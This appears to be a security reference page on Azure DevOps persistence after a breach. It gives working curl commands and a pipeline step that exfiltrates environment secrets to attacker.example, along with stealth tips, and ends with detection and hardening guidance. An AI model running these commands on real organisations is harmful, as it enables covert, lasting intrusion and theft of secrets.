---
cstg_id: CSTG-AZURE-DEVOPS-PERSIST
title: "AZURE Devops - Persistence"
provider: azure
service: devops
phase: persistence
required_access: assumed-breach
required_permissions:
  - "Create/manage Personal Access Tokens (token administration)"
  - "Register OAuth app / manage SSH public keys (profile)"
  - "Administer service connection (Endpoints namespace)"
  - "Edit pipeline / Edit YAML (Build namespace)"
  - "Manage service hooks / subscriptions"
  - "Administer agent pool (DistributedTask namespace)"
  - "Manage group membership (Graph) / Project Collection Administrators"
tools:
  - "Azure DevOps REST API"
  - "Azure CLI (az, az devops)"
  - "Git CLI"
  - "Pipeline YAML"
references:
  - "https://learn.microsoft.com/en-us/azure/devops/organizations/accounts/manage-personal-access-tokens-via-api"
  - "https://learn.microsoft.com/en-us/azure/devops/service-hooks/overview"
  - "https://learn.microsoft.com/en-us/azure/devops/pipelines/library/service-endpoints"
  - "https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/agents"
  - "https://learn.microsoft.com/en-us/azure/devops/integrate/get-started/authentication/oauth"
  - "https://learn.microsoft.com/en-us/azure/devops/organizations/security/permissions"
  - "https://www.hackingthe.cloud/azure/"
license: CC BY-SA 4.0
---

## Summary

Persistence in Azure DevOps means retaining access to source, pipelines, secrets, and the cloud identities reachable through them after initial access is obtained — ideally in ways that survive credential rotation and blend with normal CI/CD activity. Because Azure DevOps issues many long-lived authentication artifacts (PATs, OAuth grants, SSH keys, alternate auth) and runs untrusted-looking automation by design, it offers numerous durable footholds: backdoored pipelines that re-trigger on every commit, planted service connections that federate into cloud accounts, rogue self-hosted agents, service hooks that exfiltrate on events, and quiet group-membership grants.

This page catalogs the principal persistence techniques. They build on the access obtained in [azure-devops-privesc.md](../03-privilege-escalation/azure-devops-privesc.md) and the inventory gathered in [azure-devops-enum.md](../02-services/azure-devops-enum.md).

## Prerequisites

- An authenticated principal (user, service principal, or build service identity) with permissions for the chosen technique — token creation, pipeline editing, connection administration, agent pool administration, service hook management, or membership management.
- Egress to `dev.azure.com`, `vssps.dev.azure.com`, and (for federated cloud persistence) the relevant cloud control planes.

## Exploitation

### Create / manage Personal Access Tokens

PATs are the most direct persistence mechanism: a self-issued, full-scope, long-lived PAT survives password/MFA changes and grants headless API access. They can be created programmatically.

```bash
# Create a broadly scoped, long-lived PAT
curl -s -u :$ADO_PAT -X POST \
  "https://vssps.dev.azure.com/$ORG/_apis/tokens/pats?api-version=7.1-preview.1" \
  -H "Content-Type: application/json" -d '{
    "displayName": "build-cache-sync",
    "scope": "app_token",
    "validTo": "2027-12-31T00:00:00Z",
    "allOrgs": true
  }'
```

Naming the token to resemble legitimate automation ("build-cache-sync", "release-bot") reduces the chance of cleanup. Where the build service identity can administer tokens, PATs may be minted for other principals.

### Register OAuth apps and SSH public keys

- **OAuth authorizations:** registering or retaining an OAuth app authorization gives a refresh/access token grant against the ADO resource that persists independently of the user's password.
- **SSH public keys:** adding an attacker-controlled public key to the profile enables persistent Git access to all repos the principal can read/write, bypassing PAT rotation.

```bash
curl -s -u :$ADO_PAT -X POST \
  "https://vssps.dev.azure.com/$ORG/_apis/token/sshpublickeys?api-version=7.1-preview.1" \
  -H "Content-Type: application/json" \
  -d '{"name":"ci-deploy-key","sshPublicKey":"ssh-ed25519 AAAA... attacker"}'
```

### Plant or rebind a service connection (cloud persistence)

A service connection backed by an attacker-controlled Entra ID app registration (or one whose federated identity credential the attacker controls) provides durable cloud access that the DevOps org will keep using. Two variants:

1. **New connection** pointing at an attacker app with a long-lived client secret/cert, shared to all pipelines.
2. **Rebinding** an existing connection's credential to one the attacker controls, or adding a **federated identity credential** to the connection's app registration so the attacker's own pipeline/issuer can mint tokens for it.

```bash
# Create an azurerm service connection bound to an attacker-controlled app + secret
curl -s -u :$ADO_PAT -X POST \
  "https://dev.azure.com/$ORG/_apis/serviceendpoint/endpoints?api-version=7.1-preview.4" \
  -H "Content-Type: application/json" -d '{
    "name":"prod-deploy",
    "type":"azurerm",
    "url":"https://management.azure.com/",
    "authorization":{"scheme":"ServicePrincipal",
      "parameters":{"serviceprincipalid":"<attacker-app-id>","serviceprincipalkey":"<secret>","tenantid":"<tenant>"}},
    "data":{"subscriptionId":"<sub>","subscriptionName":"prod","environment":"AzureCloud","scopeLevel":"Subscription"},
    "isShared":true,
    "serviceEndpointProjectReferences":[{"projectReference":{"id":"<projId>","name":"'$PROJECT'"},"name":"prod-deploy"}]
  }'
```

Because the underlying Entra ID app and its credentials live in Azure AD (not DevOps), rotating DevOps tokens does not remove this access.

### Backdoor a pipeline (re-triggering execution)

Adding a discreet step to a frequently-run YAML pipeline gives execution on every build, with periodic access to that pipeline's secrets and service connections. Techniques to stay quiet:
- Hide the step inside a referenced **template** in a separate, less-reviewed repo.
- Trigger via a `schedules:` cron so it runs without commits.
- Use a benign-looking script that beacons or re-issues a PAT on a cadence.

```yaml
schedules:
- cron: "0 */6 * * *"
  displayName: nightly cache refresh
  branches: { include: [ main ] }
  always: true
steps:
- script: |
    # periodic re-establishment / exfil of current secrets and tokens
    curl -s -X POST https://attacker.example/c -d "$(env | base64 -w0)"
  env:
    SYSTEM_ACCESSTOKEN: $(System.AccessToken)
```

### Register a rogue self-hosted agent

Registering an attacker-controlled agent (or a malicious decorator/extension) into a pool means future jobs scheduled to that pool run on attacker infrastructure, exposing every job's secrets and service-connection tokens. This persists until the agent is deregistered and is easy to overlook among legitimate agents.

```bash
# Agents are registered with the agent software using a registration PAT;
# enumerate/confirm the rogue agent via the API:
curl -s -u :$ADO_PAT \
  "https://dev.azure.com/$ORG/_apis/distributedtask/pools/{poolId}/agents?api-version=7.1"
```

**Pipeline decorators** (organization-wide injected steps) are an especially powerful variant: an installed decorator extension runs in *every* pipeline in the organization.

### Service hooks (event-driven exfiltration)

A service hook subscription fires an HTTP webhook on events such as code pushes, build completions, or pull requests, sending payloads to an attacker endpoint — a passive, low-noise persistence/exfil channel that does not require running a pipeline.

```bash
curl -s -u :$ADO_PAT -X POST \
  "https://dev.azure.com/$ORG/_apis/hooks/subscriptions?api-version=7.1" \
  -H "Content-Type: application/json" -d '{
    "publisherId":"tfs","eventType":"git.push","resourceVersion":"1.0",
    "consumerId":"webHooks","consumerActionId":"httpRequest",
    "publisherInputs":{"projectId":"<projId>"},
    "consumerInputs":{"url":"https://attacker.example/hook"}
  }'
```

### Group membership and ACL persistence

Adding a controlled identity (a benign-looking service account or guest) to **Project Collection Administrators**, **Endpoint Administrators**, or **Build Administrators**, or setting explicit `Allow` ACLs on critical security namespace bits, creates standing privileged access that survives the loss of any single credential.

```bash
curl -s -u :$ADO_PAT -X PUT \
  "https://vssps.dev.azure.com/$ORG/_apis/graph/memberships/{subjectDescriptor}/{containerDescriptor}?api-version=7.1-preview.1"
```

### Repository backdoors

Committing subtle backdoors into shared build scripts, pipeline templates, base Docker images, or internal package-feed artifacts re-establishes execution whenever consumers build — a supply-chain-style foothold within the organization.

## Detection & Logging

- **Azure DevOps Auditing** events to alert on: `Token.PatCreateEvent` (especially `allOrgs`/long expiry/full scope), `Token.SshCreateEvent`, `Library.ServiceConnectionCreated`/`...Modified`, `Pipelines.PipelineModified` and new `schedules`, `Extension.Installed` (decorators), `Pool.AgentAdded`, service-hook `subscription` creation, and `Group.UpdateGroupMembership` / `Security.ModifyPermission`.
- **Entra ID audit logs** for new app registrations, added client secrets/certificates, and new **federated identity credentials** on apps tied to service connections.
- **Entra ID sign-in logs** for service-principal sign-ins from new IPs/issuers correlated to connection app IDs.
- **Azure Activity Logs** in target subscriptions for actions performed by persisted service-connection principals outside deployment windows.
- Scheduled/cron pipeline runs without corresponding commits; outbound HTTP from build steps to unknown hosts; new agents whose names or IPs do not match the managed fleet; service hooks pointing at external URLs.

## Remediation & Hardening

- Enforce PAT lifecycle policy: disable full-scope and `allOrgs` PATs, cap lifetime, auto-revoke inactive tokens, and alert on PAT/SSH-key creation. Restrict who can create tokens.
- Review and restrict OAuth app authorizations; disable third-party application access via OAuth unless required.
- Inventory and least-privilege all service connections; prefer Workload Identity Federation with subject constraints; alert on connection creation/modification and on new app secrets/federated credentials in Entra ID. Periodically reconcile DevOps connections against Entra ID apps.
- Require review for all pipeline and template changes, including those in referenced/template repositories; review and approve installed extensions/decorators; alert on new scheduled triggers.
- Lock down agent pool administration; use ephemeral, managed, or Microsoft-hosted agents; alert on new agent registration and reconcile the agent inventory.
- Restrict service-hook creation and review existing subscriptions for external endpoints.
- Tightly control and continuously audit membership of Project Collection Administrators, Endpoint Administrators, and Build Administrators, and explicit ACL grants; alert on changes.
- Enable credential scanning, branch protection, and code review on shared build assets and package feeds to limit repository/supply-chain backdoors.

## Tools

- Azure DevOps REST API (tokens, service endpoints, hooks, pools, graph)
- Azure CLI (`az`, `az devops` extension)
- Git CLI
- Pipeline YAML, templates, and decorator extensions

## References

- Manage PATs via API — https://learn.microsoft.com/en-us/azure/devops/organizations/accounts/manage-personal-access-tokens-via-api
- Service hooks overview — https://learn.microsoft.com/en-us/azure/devops/service-hooks/overview
- Service connections — https://learn.microsoft.com/en-us/azure/devops/pipelines/library/service-endpoints
- Azure Pipelines agents — https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/agents
- OAuth and authentication — https://learn.microsoft.com/en-us/azure/devops/integrate/get-started/authentication/oauth
- Permissions and security namespaces — https://learn.microsoft.com/en-us/azure/devops/organizations/security/permissions
- hackingthe.cloud (Azure) — https://www.hackingthe.cloud/azure/
